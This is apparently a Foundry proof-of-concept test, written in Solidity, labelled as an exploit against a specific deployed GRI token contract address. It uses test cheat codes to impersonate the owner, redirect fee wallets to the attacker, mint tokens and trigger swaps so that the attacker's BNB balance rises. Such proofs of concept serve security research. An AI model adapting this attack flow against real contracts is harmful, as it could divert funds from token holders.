pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IGRI {
    function owner() external view returns (address);
    function setMarketingWallet(address) external;
    function setInvestingWallet(address) external;
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function _uniswapV2Router() external view returns (IUniswapV2Router);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x134C857757308AEeC4c20CA2A583F560a906ed28;
    address attacker = address(this);
    IGRI token;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IGRI(TARGET);
        owner = token.owner();
        vm.label(owner, "Owner");
        vm.label(address(token), "GRI Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial attacker BNB balance
        uint256 initialBalance = attacker.balance;

        // Impersonate owner to change wallet addresses
        vm.startPrank(owner);
        token.setMarketingWallet(attacker);
        token.setInvestingWallet(attacker);
        vm.stopPrank();

        // Get tokens for the attacker
        deal(address(token), attacker, 100000 * 1e18);

        // Add liquidity to the pair so swaps can work
        // First approve the router
        token.approve(address(token._uniswapV2Router()), 50000 * 1e18);

        // Add liquidity: 50000 tokens + 10 BNB
        token._uniswapV2Router().addLiquidityETH{
            value: 10 ether
        }(
            address(token),
            50000 * 1e18,
            0,
            0,
            attacker,
            block.timestamp + 3600
        );

        // Now transfer tokens to contract to accumulate balance
        token.transfer(TARGET, 100 * 1e18);

        // Trigger swapAndLiquify by making a transfer
        // Contract should have 100 tokens now, which exceeds _minTokenBalance (1 token)
        token.transfer(address(0xdead), 50 * 1e18);

        // Check attacker balance increased
        uint256 finalBalance = attacker.balance;
        assertGt(finalBalance, initialBalance, "Attacker BNB balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

